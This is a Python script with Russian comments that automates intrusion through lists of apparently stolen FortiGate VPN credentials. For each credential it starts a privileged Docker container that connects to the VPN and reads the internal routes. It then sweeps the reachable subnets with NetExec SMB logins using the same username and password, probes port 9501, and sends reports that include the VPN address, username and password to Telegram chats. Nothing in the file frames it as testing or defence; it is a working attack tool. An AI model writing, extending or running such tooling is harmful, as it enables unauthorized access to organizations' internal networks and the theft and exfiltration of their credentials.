
# -*- coding: utf-8 -*-
import subprocess
import requests
import time
import logging
import json
import ipaddress
import re
import os
import threading
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
import sqlite3
from datetime import datetime

# === Константы ===
DOCKER_IMAGE = "fat"
TELEGRAM_API_KEY = ""
CHAT_IDS = ["", ""]
CREDENTIALS_FILE = "vp2.json"

CONTAINER_NETWORK = "forti"
CONTAINER_IP_RANGE = "10.20.0.0/16"
MAX_WORKERS = 15

# Таймауты в секундах
CONTAINER_START_TIMEOUT = 60
SCAN_TIMEOUT = 1600
PORT_9501_TIMEOUT = 3  # seconds per host

# Параметры сканирования NXC
NXC_THREADS = 15

# Database
DB_FILE = "scan_results.db"

# Глобальный идентификатор текущего запуска
CURRENT_RUN_ID = None

# === Генерация IP-адресов ===
def generate_ips():
    network = ipaddress.ip_network(CONTAINER_IP_RANGE)
    return [str(ip) for ip in list(network.hosts())[3:1000]]

AVAILABLE_IPS = generate_ips()
CONTAINERS = []

# === Потокобезопасная отправка в Telegram ===
telegram_lock = threading.Lock()

def send_file_to_telegram(file_path, caption=None):
    
    url = f"https://api.telegram.org/bot{TELEGRAM_API_KEY}/sendDocument"
    for chat_id in CHAT_IDS:
        try:
            with open(file_path, 'rb') as f:
                with telegram_lock:
                    data = {"chat_id": chat_id}
                    if caption:
                        data["caption"] = caption[:1024]
                    response = requests.post(url,
                        data=data,
                        files={"document": f},
                        timeout=60
                    )
                    response.raise_for_status()
                    logging.info(f"File {file_path} sent to chat {chat_id}")
        except Exception as e:
            logging.error(f"File send error for chat {chat_id}: {e}")

# === Логирование ===
logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler(), logging.FileHandler("container_management.log")]
)

# === Database  ===
def init_database():
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS runs (
                id TEXT PRIMARY KEY,
                started_at TEXT DEFAULT CURRENT_TIMESTAMP,
                config TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS containers (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                run_id TEXT NOT NULL,
                container_name TEXT UNIQUE NOT NULL,
                container_ip TEXT,
                vpn_address TEXT,
                vpn_port INTEGER,
                username TEXT,
                password TEXT,
                realm TEXT,
                url TEXT,
                timestamp TEXT,
                status TEXT DEFAULT 'pending',
                started_at TEXT,
                finished_at TEXT,
                FOREIGN KEY(run_id) REFERENCES runs(id)
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS cidrs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                container_id INTEGER NOT NULL,
                cidr TEXT NOT NULL,
                discovered_at TEXT DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY(container_id) REFERENCES containers(id) ON DELETE CASCADE
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                cidr_id INTEGER NOT NULL,
                protocol TEXT,
                ip TEXT,
                port TEXT,
                hostname TEXT,
                domain TEXT,
                details TEXT,
                scanned_at TEXT DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY(cidr_id) REFERENCES cidrs(id) ON DELETE CASCADE
            )
        ''')
        
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_containers_run ON containers(run_id);')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_containers_status ON containers(status);')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_scan_results_ip ON scan_results(ip);')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_cidrs_cidr ON cidrs(cidr);')
        conn.commit()
    logging.info("? Enhanced database initialized")

# === DB Write Helpers ===
def save_container_to_db(container):
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        try:
            cursor.execute('''
                INSERT INTO containers (
                    run_id, container_name, container_ip, vpn_address, vpn_port,
                    username, password, realm, url, timestamp, started_at
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                CURRENT_RUN_ID,
                container["name"],
                container["ip"],
                container["vpnaddr"],
                int(container["port"]),
                container["user"],
                container["pass"],
                container.get("realm", ""),
                container.get("url", ""),
                container.get("timestamp", ""),
                datetime.utcnow().isoformat()
            ))
            container_id = cursor.lastrowid
            conn.commit()
            return container_id
        except sqlite3.IntegrityError:
            cursor.execute("SELECT id FROM containers WHERE container_name = ?", (container["name"],))
            row = cursor.fetchone()
            return row[0] if row else None

def save_cidr_to_db(container_id, cidr):
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("INSERT INTO cidrs (container_id, cidr) VALUES (?, ?)", (container_id, cidr))
        cidr_id = cursor.lastrowid
        conn.commit()
        return cidr_id

def save_scan_results_to_db(cidr_id, results):
    if not results:
        return
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        for host in results:
            cursor.execute('''
                INSERT INTO scan_results (
                    cidr_id, protocol, ip, port, hostname, domain, details
                ) VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                cidr_id,
                host["protocol"],
                host["ip"],
                host["port"],
                host["hostname"],
                host["domain"],
                host["details"]
            ))
        conn.commit()

# === Container Name Sanitization ===
def sanitize_container_name(name):
    sanitized = re.sub(r'[^a-zA-Z0-9_.-]', '_', str(name))
    return sanitized[:50]

# === Работа с контейнерами ===
def load_credentials():
    try:
        with open(CREDENTIALS_FILE, 'r', encoding='utf-8') as f:
            creds = json.load(f)
            logging.info(f"Loaded {len(creds)} credentials")
            return creds
    except Exception as e:
        logging.error(f"Error loading credentials: {e}")
        return []

def setup_network():
    try:
        result = subprocess.run(
            ["docker", "network", "ls", "--filter", f"name={CONTAINER_NETWORK}", "--format", "{{.Name}}"],
            stdout=subprocess.PIPE, text=True, check=True
        )
        if CONTAINER_NETWORK not in result.stdout:
            subprocess.run(
                ["docker", "network", "create", "--subnet", CONTAINER_IP_RANGE, CONTAINER_NETWORK],
                check=True
            )
            logging.info(f"Network {CONTAINER_NETWORK} created with subnet {CONTAINER_IP_RANGE}")
        else:
            logging.info(f"Network {CONTAINER_NETWORK} already exists")
    except Exception as e:
        logging.error(f"Network setup error: {e}")

def stop_and_remove_container(container_name):
    max_attempts = 3
    for attempt in range(max_attempts):
        try:
            subprocess.run(
                ["docker", "stop", container_name],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15
            )
            rm_result = subprocess.run(
                ["docker", "rm", "-f", container_name],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=15
            )
            if rm_result.returncode == 0 or "No such container" in rm_result.stderr:
                logging.info(f"Successfully removed container {container_name} (attempt {attempt + 1})")
                return True
            else:
                logging.warning(f"Attempt {attempt + 1}: Could not remove container {container_name}: {rm_result.stderr}")
        except subprocess.TimeoutExpired:
            logging.warning(f"Attempt {attempt + 1}: Timeout removing container {container_name}")
        except Exception as e:
            logging.error(f"Attempt {attempt + 1}: Error removing {container_name}: {e}")
        if attempt < max_attempts - 1:
            time.sleep(5)
    logging.error(f"Failed to remove container {container_name} after {max_attempts} attempts")
    return False

def cleanup_all_containers():
    try:
        result = subprocess.run(
            ["docker", "ps", "-a", "--filter", "ancestor=fat", "--format", "{{.Names}}"],
            stdout=subprocess.PIPE, text=True, timeout=30
        )
        containers = [name.strip() for name in result.stdout.strip().splitlines() if name.strip()]
        if containers:
            logging.info(f"Found {len(containers)} containers to clean up")
            with ThreadPoolExecutor(max_workers=15) as executor:
                futures = [executor.submit(stop_and_remove_container, name) for name in containers]
                results = [future.result() for future in as_completed(futures)]
            successful = sum(results)
            logging.info(f"Cleanup completed: {successful}/{len(containers)} containers removed successfully")
        else:
            logging.info("No containers to clean up")
    except Exception as e:
        logging.error(f"Cleanup error: {e}")

def run_container(container):
    stop_and_remove_container(container["name"])
    cmd = [
        "docker", "run", "-d", "--name", container["name"],
        "--cap-add=NET_ADMIN", "--privileged",
        "--net", CONTAINER_NETWORK, "--ip", container["ip"],
        "-e", f"VPNADDR={container['vpnaddr']}:{container['port']}",
        "-e", f"VPNUSER={container['user']}",
        "-e", f"VPNPASS={container['pass']}",
        "-e", "VPNTIMEOUT=60",
        DOCKER_IMAGE
    ]
    try:
        result = subprocess.run(
            cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            timeout=CONTAINER_START_TIMEOUT
        )
        logging.info(f"Started container {container['name']} with IP {container['ip']}")
        return True
    except Exception as e:
        logging.error(f"Error starting {container['name']}: {e}")
        return False

def wait_for_vpn_connection(container_name, max_wait=150):
    start_time = time.time()
    attempts = 0
    while time.time() - start_time < max_wait:
        attempts += 1
        try:
            result = subprocess.run(
                ["docker", "exec", container_name, "ip", "a", "show", "ppp0"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10
            )
            if result.returncode == 0 and "inet" in result.stdout:
                logging.info(f"VPN interface ppp0 with IP is up for {container_name}")
                return True
            else:
                logging.debug(f"ppp0 not ready yet for {container_name} (attempt {attempts})")
        except Exception as e:
            logging.warning(f"Error checking VPN status for {container_name} (attempt {attempts}): {e}")
        time.sleep(10)
    logging.error(f"VPN connection timeout for {container_name} after {max_wait} seconds")
    return False

def get_interface_cidr(container_name):
    cidrs = []
    try:
        result = subprocess.run(
            ["docker", "exec", container_name, "sh", "-c", "ip route | grep ppp0"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=30
        )
        if result.returncode == 0 and result.stdout.strip():
            for line in result.stdout.strip().splitlines():
                if 'ppp0' in line:
                    parts = line.split()
                    if len(parts) >= 1 and '/' in parts[0]:
                        original_cidr = parts[0]
                        try:
                            net = ipaddress.ip_network(original_cidr, strict=False)
                            if net.prefixlen == 8:
                                first_ip = str(net.network_address)
                                safe_cidr = f"{first_ip}/24"
                                logging.info(f"Restricted large CIDR {original_cidr} > {safe_cidr}")
                            else:
                                safe_cidr = original_cidr
                            ipaddress.ip_network(safe_cidr, strict=False)
                            cidrs.append(safe_cidr)
                            logging.info(f"Found CIDR: {safe_cidr} for {container_name}")
                        except ValueError:
                            logging.warning(f"Invalid CIDR found: {original_cidr}")
        return cidrs if cidrs else None
    except Exception as e:
        logging.error(f"Exception getting routes for {container_name}: {e}")
        return None

def parse_nxc_output(output, protocol):
    hosts = []
    successful_auth = 0
    errors = 0
    for line in output.strip().splitlines():
        if "[+]" in line or line.startswith(protocol):
            parts = line.split()
            if len(parts) >= 4:
                protocol_name = parts[0]
                ip = parts[1]
                port = parts[2]
                hostname = parts[3]
                domain = "N/A"
                domain_match = re.search(r"\(domain:([^)]+)\)", line)
                if domain_match:
                    domain = domain_match.group(1)
                else:
                    login_match = re.search(r"([A-Za-z0-9\.\-_]+)\\[A-Za-z0-9\.\-_]+", line)
                    if login_match:
                        domain = login_match.group(1)
                if domain == "N/A" and hostname and hostname != "[*]":
                    domain = hostname
                hosts.append({
                    "protocol": protocol_name,
                    "ip": ip,
                    "port": port,
                    "hostname": hostname,
                    "domain": domain.lower() if domain != "N/A" else domain,
                    "details": " ".join(parts[4:]) if len(parts) > 4 else ""
                })
                successful_auth += 1
        elif "[-]" in line or "ERROR" in line.upper():
            errors += 1
    return hosts, successful_auth, errors

def generate_txt_report(container, cidr, results, successful_auth, errors, scan_type="SMB"):
    report_lines = []
    report_lines.append("=" * 60)
    report_lines.append(f"NetExec {scan_type} Scan Report")
    report_lines.append(f"Target CIDR: {cidr}")
    report_lines.append(f"Container: {container['name']}")
    report_lines.append(f"VPN: {container['vpnaddr']}:{container['port']}")
    report_lines.append(f"User: {container['user']}")
    report_lines.append(f"Password: {container['pass']}")
    report_lines.append(f"Realm: {container.get('realm', 'N/A')}")
    report_lines.append(f"URL: {container.get('url', 'N/A')}")
    report_lines.append(f"Timestamp: {datetime.utcnow().isoformat()}")
    report_lines.append("-" * 60)
    report_lines.append(f"Total Hosts Found: {len(results)}")
    if scan_type == "SMB":
        report_lines.append(f"Successful Authentications: {successful_auth}")
        report_lines.append(f"Errors: {errors}")
    report_lines.append("=" * 60)
    if results:
        for i, host in enumerate(results, 1):
            report_lines.append(f"\n--- Host {i} ---")
            report_lines.append(f"IP: {host['ip']}")
            report_lines.append(f"Port: {host['port']}")
            report_lines.append(f"Hostname: {host['hostname']}")
            report_lines.append(f"Domain: {host['domain']}")
            report_lines.append(f"Protocol: {host['protocol']}")
            if host['details']:
                report_lines.append(f"Details: {host['details']}")
    else:
        report_lines.append("\nNo hosts found.")
    report_lines.append("\n" + "=" * 60)
    return "\n".join(report_lines)

# === Port 9501 Scanner (using built-in bash /dev/tcp) not wrk todo ===
def scan_port_9501_in_cidr(container_name, cidr):
    open_hosts = []
    try:
        network = ipaddress.ip_network(cidr)
        for ip in network.hosts():
            ip_str = str(ip)
            # Use bash /dev/tcp (available in most Ubuntu containers)
            cmd = ["docker", "exec", container_name, "timeout", str(PORT_9501_TIMEOUT),
                   "sh", "-c", f"echo > /dev/tcp/{ip_str}/9501 2>/dev/null && echo OPEN"]
            try:
                result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, timeout=PORT_9501_TIMEOUT + 1)
                if "OPEN" in result.stdout:
                    open_hosts.append({
                        "protocol": "TCP/9501",
                        "ip": ip_str,
                        "port": "9501",
                        "hostname": "N/A",
                        "domain": "N/A",
                        "details": "Port 9501 open"
                    })
                    logging.info(f"Port 9501 open on {ip_str} (via {container_name})")
            except Exception:
                continue
    except Exception as e:
        logging.error(f"Error scanning CIDR {cidr} for port 9501: {e}")
    return open_hosts

def perform_9501_scan(container, cidr):
    results = scan_port_9501_in_cidr(container["name"], cidr)
    if not results:
        logging.info(f"No hosts with port 9501 open in {cidr}")
        return []

    # Generate report
    txt_content = generate_txt_report(container, cidr, results, 0, 0, scan_type="TCP/9501")
    txt_path = f"port9501_report_{container['name']}_{cidr.replace('/', '_')}.txt"
    with open(txt_path, "w", encoding='utf-8') as f:
        f.write(txt_content)

    caption = (
        f"IP: {container['vpnaddr']} | Port: {container['port']}\n"
        f"User: {container['user']} | Pass: {container['pass']}\n"
        f"Port 9501 open on {len(results)} host(s)"
    )
    send_file_to_telegram(txt_path, caption=caption)

    try:
        os.remove(txt_path)
        logging.info(f"Removed temporary file {txt_path}")
    except Exception as e:
        logging.warning(f"Could not remove file {txt_path}: {e}")

    return results

def perform_smb_scan(container, cidr):
    all_results = []
    raw_output = ""
    cmd = [
        "docker", "exec", container["name"],
        "nxc", "smb", cidr,
        "-u", container["user"],
        "-p", container["pass"],
        "--threads", str(NXC_THREADS)
    ]
    logging.info(f"Starting SMB scan for {cidr} with command: {' '.join(cmd)}")
    try:
        result = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=SCAN_TIMEOUT
        )
        raw_output = result.stdout
        if result.stderr.strip():
            logging.warning(f"SMB scan stderr for {cidr}: {result.stderr}")
    except subprocess.TimeoutExpired:
        logging.error(f"SMB scan timeout for {cidr}")
        return []
    except Exception as e:
        logging.error(f"SMB scan error for {cidr}: {e}")
        return []

    results, successful_auth, errors = parse_nxc_output(raw_output, "SMB")

    # ? Only send if >2 hosts
    if len(results) <= 2:
        logging.info(f"Skipping SMB report for {cidr}: only {len(results)} hosts (<=2)")
        return []

    txt_content = generate_txt_report(container, cidr, results, successful_auth, errors, scan_type="SMB")
    txt_path = f"smb_report_{container['name']}_{cidr.replace('/', '_')}.txt"
    with open(txt_path, "w", encoding='utf-8') as f:
        f.write(txt_content)

    caption = (
        f"IP: {container['vpnaddr']} | Port: {container['port']}\n"
        f"User: {container['user']} | Pass: {container['pass']}\n"
        f"Hosts: {len(results)} | Auth: {successful_auth} | Errors: {errors}"
    )
    send_file_to_telegram(txt_path, caption=caption)

    try:
        os.remove(txt_path)
        logging.info(f"Removed temporary file {txt_path}")
    except Exception as e:
        logging.warning(f"Could not remove file {txt_path}: {e}")

    return results

def process_container(container):
    logging.info(f"Processing container: {container['name']}")
    container_id = save_container_to_db(container)
    status = "error"
    try:
        if not run_container(container):
            status = "start_failed"
            return False
        if not wait_for_vpn_connection(container["name"], max_wait=150):
            status = "vpn_failed"
            return False
        time.sleep(15)
        cidrs = get_interface_cidr(container["name"])
        if cidrs:
            for cidr in cidrs:
                cidr_id = save_cidr_to_db(container_id, cidr)
                logging.info(f"Scanning CIDR: {cidr} with container {container['name']}")

                # ?? SMB Scan (only if >2 hosts)
                smb_results = perform_smb_scan(container, cidr)
                save_scan_results_to_db(cidr_id, smb_results)

                # ?? Port 9501 Scan (send if any open)
                port9501_results = perform_9501_scan(container, cidr)
                save_scan_results_to_db(cidr_id, port9501_results)

                time.sleep(30)
            status = "success"
        else:
            logging.warning(f"No CIDRs found for {container['name']}")
            status = "no_cidrs"
    except Exception as e:
        logging.error(f"Exception processing container {container['name']}: {e}")
        status = "error"
        return False
    finally:
        with sqlite3.connect(DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE containers
                SET status = ?, finished_at = ?
                WHERE id = ?
            ''', (status, datetime.utcnow().isoformat(), container_id))
            conn.commit()
        stop_and_remove_container(container["name"])
    return status == "success"

def prepare_containers():
    creds = load_credentials()
    global CONTAINERS
    CONTAINERS = []
    for i, c in enumerate(creds):
        if i >= len(AVAILABLE_IPS):
            logging.warning(f"Not enough IP addresses. Using first {len(AVAILABLE_IPS)}")
            break
        safe_username = sanitize_container_name(c["username"])
        name = f"forticlient_{safe_username}_{i}_{uuid.uuid4().hex[:6]}"
        CONTAINERS.append({
            "name": name,
            "ip": AVAILABLE_IPS[i],
            "vpnaddr": c["ip"],
            "port": c["port"],
            "user": c["username"],
            "pass": c["password"],
            "realm": c.get("realm", ""),
            "url": c["url"],
            "timestamp": c["timestamp"]
        })
    logging.info(f"Prepared {len(CONTAINERS)} containers")
    return True

def main():
    global CURRENT_RUN_ID
    CURRENT_RUN_ID = str(uuid.uuid4())

    init_database()

    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO runs (id, config) VALUES (?, ?)
        ''', (CURRENT_RUN_ID, json.dumps({
            "NXC_THREADS": NXC_THREADS,
            "MAX_WORKERS": MAX_WORKERS,
            "CONTAINER_IP_RANGE": CONTAINER_IP_RANGE,
            "SCAN_TIMEOUT": SCAN_TIMEOUT,
            "timestamp": datetime.utcnow().isoformat()
        })))
        conn.commit()

    logging.info(f"?? Starting run {CURRENT_RUN_ID}")
    setup_network()
    cleanup_all_containers()
    if not prepare_containers():
        return
    successful = 0
    failed = 0
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        future_to_container = {
            executor.submit(process_container, container): container
            for container in CONTAINERS
        }
        for future in as_completed(future_to_container):
            container = future_to_container[future]
            try:
                result = future.result()
                if result:
                    successful += 1
                    logging.info(f"? Successfully processed {container['name']}")
                else:
                    failed += 1
                    logging.error(f"? Failed to process {container['name']}")
            except Exception as e:
                failed += 1
                logging.error(f"?? Exception in thread for {container['name']}: {e}")
    logging.info(f"Script completed. Successful: {successful}, Failed: {failed}")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logging.exception("Fatal error in main():")
        raise
